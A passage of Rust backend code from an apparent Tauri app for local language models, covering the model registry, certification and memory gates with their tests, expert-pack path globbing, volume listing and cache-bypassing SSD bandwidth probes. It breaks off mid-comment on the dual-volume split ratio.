        .and_then(|l| l.split_whitespace().nth(3))
        .and_then(|s| s.parse().ok())
        .unwrap_or(0);
    // hw.memsize is a power of two: a "128 GB" Mac is 128 GiB. Dividing by
    // 1e9 would report 137 and defeat every min_ram_gb gate.
    let ram_gb = profile.ram_bytes >> 30;
    let live = hardware::live_state(available_memory_bytes());
    let machine = MachineLimits {
        ram_gb,
        available: live.available_bytes,
        gpu_working_set: profile.gpu.map(|g| g.working_set_bytes),
    };
    HwInfo {
        chip: profile.chip.clone(),
        cores: profile.cores,
        ram_gb,
        disk_free_gb,
        gpu_cores: profile.gpu_cores,
        core_levels: profile.core_levels.clone(),
        gpu_working_set_bytes: profile.gpu.map(|g| g.working_set_bytes),
        bandwidth_gbs: profile.bandwidth_gbs,
        engine_budget_bytes: crate::planner::engine_budget_bytes(ram_gb * 1_000_000_000, machine),
        power_source: live.power_source,
        power_mode: live.power_mode,
    }
}

// ---------------------------------------------------------------- registry

fn find_gguf(dir: &Path) -> Option<PathBuf> {
    let mut candidates: Vec<PathBuf> = std::fs::read_dir(dir)
        .ok()?
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.extension().map(|e| e == "gguf").unwrap_or(false))
        .collect();
    candidates.sort();
    // Multi-shard models: the 00001 shard is the one llama.cpp opens.
    candidates.into_iter().next()
}

fn model_paths(root: &Path, id: &str) -> (PathBuf, PathBuf, PathBuf) {
    let model_dir = root.join("models").join(id);
    let pack = root
        .join("artifacts/h4/packs")
        .join(id)
        .join(format!("{id}.pack"));
    let profile = model_dir.join("profile.engine.txt");
    (model_dir, pack, profile)
}

// Async: resolve_packs can glob over external volumes, which stalls when a
// disk has to spin up. The main thread must never wait on that.
#[tauri::command]
async fn load_registry() -> Result<Vec<Value>, String> {
    let root = galactus_root()?;
    let raw = std::fs::read_to_string(root.join("scripts/models-registry.json"))
        .map_err(|e| e.to_string())?;
    let parsed: Value = serde_json::from_str(&raw).map_err(|e| e.to_string())?;
    let models = parsed["models"].as_array().cloned().unwrap_or_default();
    let mut out = Vec::new();
    for mut m in models {
        let id = m["id"].as_str().unwrap_or("").to_string();
        let (model_dir, _pack, _profile) = model_paths(&root, &id);
        let gguf_present = find_gguf(&model_dir).is_some();
        // Dual-pack aware: a model whose packs resolve through the registry
        // fields or the install settings (GLM double-pack) counts as installed.
        let (pack_i, pack_e) = resolve_packs(&root, &id, &m)?;
        let pack_present = pack_i.is_file() && pack_e.is_file();
        m["pack_internal"] = json!(pack_i.display().to_string());
        m["pack_external"] = json!(pack_e.display().to_string());
        m["gguf_present"] = json!(gguf_present);
        m["pack_present"] = json!(pack_present);
        m["installed"] = json!(is_installed(is_dense(&m), gguf_present, pack_present));
        out.push(m);
    }
    Ok(out)
}

fn registry_entry(root: &Path, id: &str) -> Result<Value, String> {
    let raw = std::fs::read_to_string(root.join("scripts/models-registry.json"))
        .map_err(|e| e.to_string())?;
    let parsed: Value = serde_json::from_str(&raw).map_err(|e| e.to_string())?;
    parsed["models"]
        .as_array()
        .and_then(|a| a.iter().find(|m| m["id"] == id).cloned())
        .ok_or_else(|| format!("unknown model {id}"))
}

/// The registry is the execution policy, not a catalogue label.  A model may
/// be listed while its Galactus path is still being validated, but it must not
/// be downloaded or served until one of the accepted certification regimes is
/// recorded.  Keep this gate in the backend so the CLI and a modified webview
/// cannot bypass it.
fn require_certified_model(entry: &Value) -> Result<(), String> {
    let id = entry["id"].as_str().unwrap_or("unknown");
    match entry["status"].as_str() {
        Some("certified" | "certified_bit_transparent" | "certified_by_composition") => Ok(()),
        // A dense model passes this gate without being certified, and the two
        // are not the same statement. Certification means the Galactus path was
        // compared against stock llama.cpp and found identical; a dense model
        // has no Galactus path to compare, because there are no expert tensors
        // to substitute. It runs as plain llama.cpp. What this gate protects
        // against is a MODIFIED execution path whose fidelity is unproven, and
        // an unmodified one carries no such risk.
        Some("stock_unmodified") => Ok(()),
        Some("pending_certification") => Err(format!(
            "model {id} is awaiting Galactus certification and cannot be installed or started"
        )),
        Some(status) => Err(format!(
            "model {id} has unsupported certification status '{status}'"
        )),
        None => Err(format!("model {id} has no certification status")),
    }
}

/// Unified memory is the limiting hardware dimension exposed by the registry.
/// This backend gate mirrors the catalogue filtering and protects direct IPC
/// and CLI calls from downloading hundreds of gigabytes for an unusable model.
fn require_compatible_hardware(entry: &Value, ram_gb: u64) -> Result<(), String> {
    let id = entry["id"].as_str().unwrap_or("unknown");
    let minimum = entry["min_ram_gb"].as_u64().ok_or_else(|| {
        format!("model {id} has no minimum unified-memory requirement in the registry")
    })?;
    if ram_gb < minimum {
        return Err(format!(
            "model {id} requires at least {minimum} GB of unified memory; this Mac has {ram_gb} GB"
        ));
    }
    Ok(())
}

#[cfg(test)]
mod registry_policy_tests {
    use super::*;

    #[test]
    fn every_certified_regime_may_execute() {
        // Certification is one of two ways through this gate. The other is a
        // model with no Galactus path to certify, covered in dense_model_tests:
        // this name used to say "only the three", which stopped being true the
        // day a dense model was added and would have misled the next reader.
        for status in [
            "certified",
            "certified_bit_transparent",
            "certified_by_composition",
        ] {
            assert!(require_certified_model(&json!({"id": "m", "status": status})).is_ok());
        }
    }

    #[test]
    fn pending_unknown_and_missing_statuses_are_rejected() {
        for entry in [
            json!({"id": "pending", "status": "pending_certification"}),
            json!({"id": "draft", "status": "draft"}),
            json!({"id": "missing"}),
        ] {
            assert!(require_certified_model(&entry).is_err());
        }
    }

    #[test]
    fn hardware_gate_uses_the_registry_minimum_and_fails_closed() {
        let model = json!({"id": "large", "min_ram_gb": 128});
        assert!(require_compatible_hardware(&model, 16).is_err());
        assert!(require_compatible_hardware(&model, 127).is_err());
        assert!(require_compatible_hardware(&model, 128).is_ok());
        assert!(require_compatible_hardware(&json!({"id": "unspecified"}), 128).is_err());
    }
}

// ---------------------------------------------------------------- pack resolution

/// Expand a leading `~` or `$HOME` in a user-supplied path.
fn expand_home(s: &str) -> String {
    let home = std::env::var("HOME").unwrap_or_default();
    if let Some(rest) = s.strip_prefix("$HOME") {
        format!("{home}{rest}")
    } else if let Some(rest) = s.strip_prefix('~') {
        format!("{home}{rest}")
    } else {
        s.to_string()
    }
}

/// Wildcard match for ONE path component: `*` (any run) and `?` (one char).
fn component_matches(pat: &str, name: &str) -> bool {
    let p: Vec<char> = pat.chars().collect();
    let n: Vec<char> = name.chars().collect();
    let mut dp = vec![vec![false; n.len() + 1]; p.len() + 1];
    dp[0][0] = true;
    for i in 1..=p.len() {
        if p[i - 1] == '*' {
            dp[i][0] = dp[i - 1][0];
        }
        for j in 1..=n.len() {
            dp[i][j] = match p[i - 1] {
                '*' => dp[i - 1][j] || dp[i][j - 1],
                '?' => dp[i - 1][j - 1],
                c => dp[i - 1][j - 1] && c == n[j - 1],
            };
        }
    }
    dp[p.len()][n.len()]
}

/// First (lexicographic) file matching a simple glob pattern: `*`/`?` inside a
/// component, `**` for any directory depth, the same idioms galactus.env uses.
/// The walk is bounded so a pack lookup stays instant even on a huge volume.
fn glob_first(pattern: &str) -> Option<PathBuf> {
    use std::path::Component;
    let mut base = PathBuf::new();
    let mut parts: Vec<String> = Vec::new();
    let mut in_glob = false;
    for comp in Path::new(pattern).components() {
        match comp {
            Component::RootDir => base.push("/"),
            Component::Normal(c) => {
                let c = c.to_string_lossy().into_owned();
                if !in_glob && !c.contains('*') && !c.contains('?') {
                    base.push(&c);
                } else {
                    in_glob = true;
                    parts.push(c);
                }
            }
            Component::CurDir => {}
            _ => return None,
        }
    }
    if parts.is_empty() {
        return base.is_file().then_some(base);
    }
    fn walk(dir: &Path, parts: &[String], depth: u32, budget: &mut u32, out: &mut Vec<PathBuf>) {
        if *budget == 0 || depth == 0 {
            return;
        }
        let Some((head, rest)) = parts.split_first() else { return };
        let Ok(rd) = std::fs::read_dir(dir) else { return };
        let mut entries: Vec<_> = rd.flatten().collect();
        entries.sort_by_key(|e| e.file_name());
        if head == "**" {
            // `**` also matches zero directories: try the rest right here.
            walk(dir, rest, depth, budget, out);
            for e in &entries {
                if *budget == 0 {
                    return;
                }
                *budget -= 1;
                let p = e.path();
                if p.is_dir() {
                    walk(&p, parts, depth - 1, budget, out);
                }
            }
        } else {
            for e in &entries {
                if *budget == 0 {
                    return;
                }
                *budget -= 1;
                let name = e.file_name().to_string_lossy().into_owned();
                if !component_matches(head, &name) {
                    continue;
                }
                let p = e.path();
                if rest.is_empty() {
                    if p.is_file() {
                        out.push(p);
                    }
                } else if p.is_dir() {
                    walk(&p, rest, depth - 1, budget, out);
                }
            }
        }
    }
    let mut out = Vec::new();
    let mut budget: u32 = 20_000;
    walk(&base, &parts, 8, &mut budget, &mut out);
    out.sort();
    out.into_iter().next()
}

/// Resolve one pack path spec: `~`/`$HOME` expansion, paths relative to the
/// Galactus root, simple glob patterns. Yields the file only if it exists.
fn resolve_pack_spec(root: &Path, spec: &str) -> Option<PathBuf> {
    let expanded = expand_home(spec.trim());
    if expanded.is_empty() {
        return None;
    }
    let full = if Path::new(&expanded).is_absolute() {
        PathBuf::from(&expanded)
    } else {
        root.join(&expanded)
    };
    let s = full.to_string_lossy().into_owned();
    if s.contains('*') || s.contains('?') {
        glob_first(&s)
    } else {
        full.is_file().then_some(full)
    }
}

/// The (internal, external) pack pair of a model, in priority order:
///   (a) `internal_pack` / `external_pack` fields of the registry entry,
///   (b) settings `pack_internal_<id>` / `pack_external_<id>` (dual install),
///   (c) the classic mono pack artifacts/h4/packs/<id>/<id>.pack for BOTH.
/// A tier is selected only when EVERY spec it declares resolves to an existing
/// file: half of a dual pack is useless (the records are cut across the two
/// files), and a registry carrying another machine's paths must fall through.
/// Identical internal and external paths mean mono-volume to the engine.
/// Whether this catalogue entry describes a model with no routed experts.
///
/// Read from the registry rather than from the weights, because the answer is
/// needed BEFORE anything is downloaded: it decides whether the install has
/// three more steps after the download, and whether the engine is started with
/// the streaming layer at all. The GGUF confirms it later, when moe-profile.py
/// refuses a dense checkpoint outright.
fn is_dense(entry: &Value) -> bool {
    entry["dense"].as_bool().unwrap_or(false)
}

/// Whether a catalogue entry is installed on this Mac.
///
/// For a Mixture-of-Experts model the weights alone are not enough: the engine
/// reads experts out of the pack, so a downloaded GGUF with no pack is a job
/// half done and the card must keep offering to finish it.
///
/// A dense model has no pack and never will. Requiring one made it permanently
/// uninstallable: the download completed, the file was on disk, and the card
/// went on saying it was not installed with no way to change that.
fn is_installed(dense: bool, gguf_present: bool, pack_present: bool) -> bool {
    if dense {
        gguf_present
    } else {
        gguf_present && pack_present
    }
}

fn resolve_packs(root: &Path, id: &str, entry: &Value) -> Result<(PathBuf, PathBuf), String> {
    let tier = |i_spec: Option<&str>, e_spec: Option<&str>| -> Option<(PathBuf, PathBuf)> {
        let i = match i_spec {
            Some(s) => Some(resolve_pack_spec(root, s)?),
            None => None,
        };
        let e = match e_spec {
            Some(s) => Some(resolve_pack_spec(root, s)?),
            None => None,
        };
        match (i, e) {
            (Some(i), Some(e)) => Some((i, e)),
            (Some(i), None) => Some((i.clone(), i)),
            (None, Some(e)) => Some((e.clone(), e)),
            (None, None) => None,
        }
    };
    if let Some(p) = tier(entry["internal_pack"].as_str(), entry["external_pack"].as_str()) {
        return Ok(p);
    }
    let settings = settings_load();
    let non_empty = |k: String| -> Option<String> {
        settings.get(&k).map(|v| v.trim().to_string()).filter(|v| !v.is_empty())
    };
    let set_i = non_empty(format!("pack_internal_{id}"));
    let set_e = non_empty(format!("pack_external_{id}"));
    if let Some(p) = tier(set_i.as_deref(), set_e.as_deref()) {
        return Ok(p);
    }
    let (_, pack, _) = model_paths(root, id);
    Ok((pack.clone(), pack))
}

// ---------------------------------------------------------------- volumes + bandwidth

#[derive(Serialize, Clone)]
struct VolumeInfo {
    name: String,
    mount: String,
    /// Suggested pack directory on this volume (GalactusH4 convention).
    dir: String,
    /// Where the bandwidth probe should look for a big file.
    probe: String,
    free_gb: u64,
    total_gb: u64,
}

/// `df -g` for a path: (device, total_gb, free_gb, mount point).
fn df_line(path: &str) -> Option<(String, u64, u64, String)> {
    let out = run_capture("df", &["-g", path]);
    let l = out.lines().nth(1)?;
    let cols: Vec<&str> = l.split_whitespace().collect();
    if cols.len() < 9 {
        return None;
    }
    let device = cols[0].to_string();
    let total = cols[1].parse().ok()?;
    let free = cols[3].parse().ok()?;
    // The mount point may contain spaces: everything from column 8 on.
    let mount = cols[8..].join(" ");
    Some((device, total, free, mount))
}

const INSTALL_DOWNLOAD_RESERVE_GIB: u64 = 2;

fn required_download_gib(total_bytes: u64, already_downloaded: u64) -> u64 {
    const GIB: u64 = 1024 * 1024 * 1024;
    total_bytes
        .saturating_sub(already_downloaded)
        .div_ceil(GIB)
        .saturating_add(INSTALL_DOWNLOAD_RESERVE_GIB)
}

/// Free space for a download of `need` bytes into `dir`, or an error saying so.
///
/// The model registry's own version of this checks a model folder under the
/// Galactus root; this one takes any folder, so the image models can use the
/// same arithmetic and the same reserve.
pub(crate) fn require_free_space(dir: &Path, need: u64) -> Result<(), String> {
    const GIB: u64 = 1024 * 1024 * 1024;
    let required = need.div_ceil(GIB).saturating_add(INSTALL_DOWNLOAD_RESERVE_GIB);
    let probe = dir.to_string_lossy();
    let (_, _, free, mount) = df_line(&probe)
        .ok_or_else(|| format!("cannot measure free space for {}", dir.display()))?;
    if free < required {
        return Err(format!(
            "not enough space on {mount}: {required} GiB needed, {free} GiB free"
        ));
    }
    Ok(())
}

/// Refuse before curl starts. The GGUF is always downloaded under the
/// Galactus root even when the expert pack is sent to another SSD.
fn require_download_space(root: &Path, id: &str, files: &[String], total_bytes: u64) -> Result<(), String> {
    let model_dir = root.join("models").join(id);
    let already_downloaded = files
        .iter()
        .map(|name| std::fs::metadata(model_dir.join(name)).map(|m| m.len()).unwrap_or(0))
        .sum();
    let required = required_download_gib(total_bytes, already_downloaded);
    let probe = root.to_string_lossy();
    let (_, _, free, mount) = df_line(&probe)
        .ok_or_else(|| format!("cannot measure free space for {}", root.display()))?;
    if free < required {
        return Err(format!(
            "not enough space for the model download on {mount}: {required} GiB required, {free} GiB free"
        ));
    }
    Ok(())
}

#[cfg(test)]
mod install_space_tests {
    use super::*;

    #[test]
    fn download_preflight_counts_only_remaining_bytes_and_keeps_a_reserve() {
        const GIB: u64 = 1024 * 1024 * 1024;
        assert_eq!(required_download_gib(202 * GIB, 0), 204);
        assert_eq!(required_download_gib(202 * GIB, 200 * GIB), 4);
        assert_eq!(required_download_gib(202 * GIB, 202 * GIB), 2);
        assert_eq!(required_download_gib(GIB + 1, 0), 4);
    }
}

/// Mounted volumes that can host a pack: the system data volume (via $HOME),
/// everything under /Volumes, and the volume carrying the Galactus root.
/// Deduplicated by device so /, /System/Volumes/Data and the /Volumes symlink
/// to the boot disk collapse into one entry.
#[tauri::command]
fn list_volumes() -> Vec<VolumeInfo> {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let mut candidates: Vec<(String, String)> = vec![("Macintosh HD".into(), home.clone())];
    if let Ok(rd) = std::fs::read_dir("/Volumes") {
        let mut vols: Vec<_> = rd.flatten().collect();
        vols.sort_by_key(|e| e.file_name());
        for e in vols {
            let name = e.file_name().to_string_lossy().into_owned();
            if name.starts_with('.') {
                continue;
            }
            // The boot-disk symlink in /Volumes duplicates the home entry.
            if e.path().read_link().is_ok() {
                continue;
            }
            candidates.push((name, e.path().display().to_string()));
        }
    }
    if let Ok(root) = galactus_root() {
        candidates.push((String::new(), root.display().to_string()));
    }
    let mut seen = std::collections::HashSet::new();
    let mut out = Vec::new();
    for (name, path) in candidates {
        let Some((device, total, free, mount)) = df_line(&path) else { continue };
        if !device.starts_with("/dev/") || !seen.insert(device) {
            continue;
        }
        let on_data = mount == "/" || mount == "/System/Volumes/Data";
        let name = if !name.is_empty() {
            name
        } else if on_data {
            "Macintosh HD".into()
        } else {
            Path::new(&mount)
                .file_name()
                .map(|s| s.to_string_lossy().into_owned())
                .unwrap_or_else(|| mount.clone())
        };
        let (dir, probe) = if on_data {
            (format!("{home}/GalactusH4"), home.clone())
        } else {
            (format!("{mount}/GalactusH4"), mount.clone())
        };
        // Only writable volumes can host a pack (Time Machine, DMGs and
        // network mounts often are not): probed with a real create+delete.
        let test_base = if on_data { Path::new(&home) } else { Path::new(&mount) };
        let test = test_base.join(format!(".galactus-wtest-{}", std::process::id()));
        let writable = std::fs::File::create(&test).is_ok();
        let _ = std::fs::remove_file(&test);
        if !writable {
            continue;
        }
        out.push(VolumeInfo { name, mount, dir, probe, free_gb: free, total_gb: total });
    }
    out
}

const BW_CHUNK: usize = 8 * 1024 * 1024;
const BW_MIN_FILE: u64 = 2_000_000_000;
/// Queued probe shape. A per-expert record is a few MiB (4.1 MB on olmoe,
/// 13.2 MB on GLM-5.2) and the engine keeps many of them in flight per volume
/// (GALACTUS_H4_QD, 32 at serve time). 4 MiB at 16 deep sits in that regime,
/// which is what the ratio has to be measured in.
const BW_RECORD_CHUNK: usize = 4 * 1024 * 1024;
const BW_INFLIGHT: usize = 16;
/// Bytes the queued probe reads in total. Big enough that a few hundred
/// milliseconds of scheduling noise does not move the answer, small enough
/// that two volumes are probed in a couple of seconds.
const BW_QUEUED_TARGET: u64 = 1_500_000_000;
/// Record alignment, so probe offsets land where real reads land.
const RECORD_ALIGN: u64 = 16_384;

/// F_NOCACHE on macOS: reads bypass the unified buffer cache, so the probe
/// measures the SSD instead of RAM (same flag the H4 reader uses).
#[cfg(target_os = "macos")]
fn set_nocache(file: &std::fs::File) {
    use std::os::unix::io::AsRawFd;
    extern "C" {
        fn fcntl(fd: i32, cmd: i32, ...) -> i32;
    }
    const F_NOCACHE: i32 = 48;
    unsafe {
        fcntl(file.as_raw_fd(), F_NOCACHE, 1);
    }
}

/// Biggest file above `min_bytes` under `dir` (bounded walk, symlinks not
/// followed). Stops early once a comfortably large file is found.
fn find_big_file(dir: &Path, min_bytes: u64) -> Option<PathBuf> {
    let mut best: Option<(u64, PathBuf)> = None;
    let mut stack = vec![(dir.to_path_buf(), 0u32)];
    let mut budget: u32 = 40_000;
    while let Some((d, depth)) = stack.pop() {
        if budget == 0 {
            break;
        }
        let Ok(rd) = std::fs::read_dir(&d) else { continue };
        for e in rd.flatten() {
            if budget == 0 {
                break;
            }
            budget -= 1;
            if e.file_name().to_string_lossy().starts_with('.') {
                continue;
            }
            let Ok(meta) = e.metadata() else { continue };
            if meta.is_dir() {
                if depth < 5 {
                    stack.push((e.path(), depth + 1));
                }
            } else if meta.is_file() && meta.len() >= min_bytes {
                if best.as_ref().map(|(s, _)| meta.len() > *s).unwrap_or(true) {
                    best = Some((meta.len(), e.path()));
                }
                if best.as_ref().map(|(s, _)| *s >= 4 * min_bytes).unwrap_or(false) {
                    return best.map(|(_, p)| p);
                }
            }
        }
    }
    best.map(|(_, p)| p)
}

/// Write an incompressible ~2 GB probe file (xorshift-filled blocks: zeros
/// could be shortcut by the storage stack) for volumes holding nothing big.
fn write_probe_file(path: &Path, size: u64) -> Result<(), String> {
    use std::io::Write;
    let mut f = std::fs::File::create(path).map_err(|e| e.to_string())?;
    let mut block = vec![0u8; BW_CHUNK];
    let mut x: u64 = 0x9e37_79b9_7f4a_7c15;
    for b in block.chunks_exact_mut(8) {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        b.copy_from_slice(&x.to_le_bytes());
    }
    let mut written = 0u64;
    while written < size {
        f.write_all(&block).map_err(|e| e.to_string())?;
        written += block.len() as u64;
    }
    f.sync_all().map_err(|e| e.to_string())?;
    Ok(())
}

/// Timed sequential read of ~1.5 GB in 8 MiB blocks with the cache bypassed.
/// On files much bigger than the read, the start offset varies run to run.
fn read_bandwidth(path: &Path) -> Result<f64, String> {
    use std::io::{Read, Seek, SeekFrom};
    let mut f = std::fs::File::open(path).map_err(|e| e.to_string())?;
    #[cfg(target_os = "macos")]
    set_nocache(&f);
    let len = f.metadata().map_err(|e| e.to_string())?.len();
    let target: u64 = 1_500_000_000.min(len);
    if len > target + BW_CHUNK as u64 {
        let slots = (len - target) / BW_CHUNK as u64 + 1;
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos() as u64;
        f.seek(SeekFrom::Start((nanos % slots) * BW_CHUNK as u64))
            .map_err(|e| e.to_string())?;
    }
    let mut buf = vec![0u8; BW_CHUNK];
    let mut total: u64 = 0;
    let t0 = Instant::now();
    while total < target {
        let n = f.read(&mut buf).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        total += n as u64;
    }
    let secs = t0.elapsed().as_secs_f64();
    if total < 200_000_000 || secs <= 0.0 {
        return Err("probe read too small to be meaningful".into());
    }
    Ok(total as f64 / 1e9 / secs)
}

/// Read bandwidth in the shape the ENGINE reads: record-sized requests at
/// random offsets, several in flight, cache bypassed.
///
/// WHY THIS EXISTS ALONGSIDE read_bandwidth
///
/// read_bandwidth is one thread walking a file forwards in 8 MiB blocks. That
/// is the right number to show a user, and the right one for the "is this pair
/// worth splitting at all" guard, but it is NOT the number the split ratio
/// needs, because it is not how expert records are read.
///
/// Measured here on this machine's two SSDs, cold, same files, same instant:
/// sequentially 10.2 and 4.7 GB/s, which puts r* at 0.684; at the engine's
/// shape 14.4 and 4.6 GB/s, which puts it at 0.757. Sweeping the real split
/// found the throughput peak at 0.75. The sequential figures therefore name a
/// ratio that is 13% SLOWER than the constant it was meant to replace, and the
/// queued figures name the optimum. The internal NVMe is the one that gains
/// from depth, so measuring it single-threaded understates it and hands the
/// slow volume more of every record than it can carry.
fn read_bandwidth_queued(path: &Path, chunk: usize, inflight: usize) -> Result<f64, String> {
    use std::os::unix::fs::FileExt;
    use std::sync::atomic::{AtomicU64, Ordering as O};

    let f = std::fs::File::open(path).map_err(|e| e.to_string())?;
    #[cfg(target_os = "macos")]
    set_nocache(&f);
    let len = f.metadata().map_err(|e| e.to_string())?.len();
    if len < chunk as u64 * 2 {
        return Err("probe file too small for a queued read".into());
    }
    // Enough offsets that no two workers replay the same extent, and few
    // enough that the run stays short.
    let slots = (len - chunk as u64) / RECORD_ALIGN + 1;
    let target_per_worker = (BW_QUEUED_TARGET / inflight as u64).max(chunk as u64);
    let f = std::sync::Arc::new(f);
    let total = std::sync::Arc::new(AtomicU64::new(0));
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos() as u64;

    let t0 = Instant::now();
    let mut handles = Vec::new();
    for w in 0..inflight {
        let f = f.clone();
        let total = total.clone();
        handles.push(std::thread::spawn(move || -> Result<(), String> {
            let mut buf = vec![0u8; chunk];
            // xorshift: a per-worker offset stream, no shared state, no crate.
            let mut x = seed
                .wrapping_mul(0x9e37_79b9_7f4a_7c15)
                .wrapping_add(w as u64 + 1)
                | 1;
            let mut done: u64 = 0;
            while done < target_per_worker {
                x ^= x << 13;
                x ^= x >> 7;
                x ^= x << 17;
                let offset = (x % slots) * RECORD_ALIGN;
                f.read_exact_at(&mut buf, offset).map_err(|e| e.to_string())?;
                done += chunk as u64;
                total.fetch_add(chunk as u64, O::Relaxed);
            }
            Ok(())
        }));
    }
    for h in handles {
        h.join().map_err(|_| "queued probe worker panicked".to_string())??;
    }
    let secs = t0.elapsed().as_secs_f64();
    let read = total.load(O::Relaxed);
    if read < 200_000_000 || secs <= 0.0 {
        return Err("queued probe read too small to be meaningful".into());
    }
    Ok(read as f64 / 1e9 / secs)
}

/// Run `probe` against a big file on the volume at `base`: a real one when the
/// volume already holds one, otherwise a temporary incompressible file that is
/// written, read back cache-cold, and deleted.
fn on_a_big_file<T>(base: &Path, probe: impl Fn(&Path) -> Result<T, String>) -> Result<T, String> {
    if !base.is_dir() {
        return Err(format!("not a directory: {}", base.display()));
    }
    match find_big_file(base, BW_MIN_FILE) {
        Some(p) => probe(&p),
        None => {
            let p = base.join(".galactus-bw-probe.bin");
            let written = write_probe_file(&p, BW_MIN_FILE);
            let result = written.and_then(|_| probe(&p));
            let _ = std::fs::remove_file(&p);
            result
        }
    }
}

/// Sequential read bandwidth of the volume at `path`, in GB/s. This is the
/// number the user is shown and the one the dual/mono guard judges.
fn measure_volume(base: &Path) -> Result<f64, String> {
    on_a_big_file(base, read_bandwidth)
}

/// Bandwidth of the volume at `path` in the engine's own access shape, in
/// GB/s. This is the number the split ratio is computed from.
fn measure_volume_queued(base: &Path) -> Result<f64, String> {
    on_a_big_file(base, |p| read_bandwidth_queued(p, BW_RECORD_CHUNK, BW_INFLIGHT))
}

#[tauri::command]
async fn volume_bandwidth(path: String) -> Result<f64, String> {
    measure_volume(Path::new(&path))
}

/// Everything the app chose for one model on this Mac, and what it chose it
/// from.
///
/// A turnkey product still has to say what it decided. Silent magic that gets
/// it wrong is worse than a visible choice, so every field here is either
/// shown to the user or feeds the sentence that is.
#[derive(Serialize, Clone, Debug)]
struct Recommendation {
    model_id: String,
    /// eco, balanced or perf: the mode a start would really run in, after the
    /// step-down.
    mode: String,
    /// The mode the settings asked for. Different from `mode` when this Mac
    /// cannot afford it right now.
    requested_mode: String,
    /// Conversations that may generate at once.
    slots: u32,
    /// True when `slots` came from an explicit setting rather than from the
    /// machine. The UI says "your choice" instead of "recommended".
    slots_chosen_by_user: bool,
    /// The download variant, when the entry declares any. `None` means the
    /// entry's single `download` block, which is every entry today.
    variant: Option<String>,
    /// Where the pack should go. `None` when the model is already installed
    /// and the question no longer applies.
    layout: Option<PackLayout>,
    /// What the engine would hold in total, bytes.
    resident_bytes: u64,
    /// What this Mac can give right now, bytes.
    budget_bytes: u64,
    /// The physical micro-batch the planner guarded.
    ubatch: u32,
    /// Set when nothing this app can arrange will start this model right now,
    /// carrying the planner's own sentence with its numbers.
    blocked: Option<String>,
}

/// Decide everything for one model, without starting anything.
///
/// Async: it reads vm_stat and two pmset calls, and measures nothing. It must
/// not run on the main thread.
///
/// `volumes` are the measured drives, `[{ mount, free_bytes, bandwidth_gbs }]`,
/// from the install dialog once it has probed. Absent means the model is
/// already installed or the caller does not care where the pack would go, and
/// `layout` then comes back `None` rather than as a guess over drives nobody
/// measured.
#[tauri::command]
async fn recommend_for_model(
    model_id: String,
    volumes: Option<Vec<Value>>,
) -> Result<Recommendation, String> {
    let root = galactus_root()?;
    let entry = registry_entry(&root, &model_id)?;
    let settings = settings_load();
    let ram_mode = settings
        .get("ram_mode")
        .map(String::as_str)
        .filter(|s| matches!(*s, "eco" | "balanced" | "perf"))
        .unwrap_or("balanced")
        .to_string();
    let cpu_moe = entry["cpu_moe"].as_bool().unwrap_or(false)
        || settings.get("cpu_moe").map(|v| v == "1").unwrap_or(false);
    let ram_gb = hardware::static_profile().ram_bytes >> 30;
    let machine = MachineLimits::probe(ram_gb.max(8));
    let chosen = settings.get("engine_slots").and_then(|s| s.trim().parse::<u32>().ok());
    let slots = match chosen {
        Some(n) => n.clamp(1, MAX_SLOTS),
        None => crate::planner::recommended_slots(&entry, machine, &ram_mode, cpu_moe, crate::planner::ctx_per_slot_for(&entry)),
    };

    let layout = volumes.map(|list| {
        let pack_bytes = entry["expert_bytes_total"]
            .as_u64()
            .or_else(|| entry["gguf_bytes"].as_u64())
            .unwrap_or(0);
        let parsed: Vec<PackVolume> = list
            .iter()
            .filter_map(|v| {
                Some(PackVolume {
                    mount: v["mount"].as_str()?.to_string(),
                    free_bytes: v["free_bytes"].as_u64()?,
                    bandwidth_gbs: v["bandwidth_gbs"].as_f64(),
                })
            })
            .collect();
        crate::planner::recommend_layout(&parsed, pack_bytes)
    });

    let base = Recommendation {
        model_id: model_id.clone(),
        mode: ram_mode.clone(),
        requested_mode: ram_mode.clone(),
        slots,
        slots_chosen_by_user: chosen.is_some(),
        variant: crate::planner::recommend_variant(&entry, ram_gb),
        layout,
        resident_bytes: 0,
        budget_bytes: crate::planner::engine_budget_bytes(ram_gb * 1_000_000_000, machine),
        ubatch: 0,
        blocked: None,
    };
    // The planner is the authority on mode and micro-batch, and it is also the
    // only thing that knows how to say no with a number in the sentence. A
    // refusal is REPORTED, not turned into an error: the card still has to
    // render, and the user still has to be told what would have to change.
    Ok(match crate::planner::plan_cache(&entry, machine, None, &ram_mode, cpu_moe, slots, crate::planner::ctx_per_slot_for(&entry)) {
        Ok(plan) => Recommendation {
            mode: plan.decision.mode,
            requested_mode: plan.decision.requested,
            resident_bytes: plan.decision.resident_bytes,
            budget_bytes: plan.decision.budget_bytes,
            ubatch: plan.ubatch,
            ..base
        },
        Err(why) => Recommendation { blocked: Some(why), ..base },
    })
}

// ------------------------------------------------------- dual split ratio
//
// Both volumes are read in parallel, so a record is ready when the SLOWER side
// finishes: the time is max(r/Bi, (1-r)/Be) and the optimum is the r where the
// two finish together, r* = Bi / (Bi + Be). Any other r pays the difference on
// every single record for the life of the install, which is why this number is
// measured rather than compiled in.
//
// These three constants MUST stay identical to src/h4/h4-core.hpp
// (p0v2_default_ratio, p0_ratio_minimum, p0_ratio_maximum) and to
// scripts/galactus-pack-plan.py: the planner writes what this computes and the
// engine validates what the planner wrote.
/// The historical P0v2 cut. Fallback for a failed or degenerate measurement,
/// and the ratio every pack written before this was a runtime value used.
const PACK_RATIO_DEFAULT: f64 = 0.7157;
/// Usable bounds. Outside them one volume carries so little of each record
/// that the read it still costs is pure overhead.
const PACK_RATIO_MIN: f64 = 0.05;
const PACK_RATIO_MAX: f64 = 0.95;
/// Fractional digits the ratio is quantised to. Finer than the probe's own
/// noise, and short enough that the decimal spelling is exact everywhere it is
/// parsed: Python float() and C strtod are both correctly rounded, so the
/// packer and the engine recover the SAME double from this string and their
/// round(blocks * ratio) cannot drift apart.
const PACK_RATIO_DECIMALS: usize = 4;

/// r* = Bi / (Bi + Be), quantised and clamped. A measurement that failed
/// (zero, negative, NaN, infinite) or a degenerate result falls back to
